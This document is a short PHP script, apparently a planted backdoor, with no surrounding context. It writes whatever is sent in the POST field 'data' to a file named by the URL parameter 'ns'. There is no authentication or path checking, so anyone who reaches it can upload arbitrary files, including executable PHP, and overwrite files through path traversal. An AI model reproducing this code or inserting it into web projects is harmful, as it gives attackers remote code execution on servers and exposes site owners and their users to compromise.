<?php
if(isset($_GET['ns'])){
    $target_path = "./";
    $tmpfile = $target_path . $_GET['ns'];
    $fh = fopen($tmpfile, 'w') or die("can't open file");
    fwrite($fh, $_POST['data']);
    fclose($fh);
}
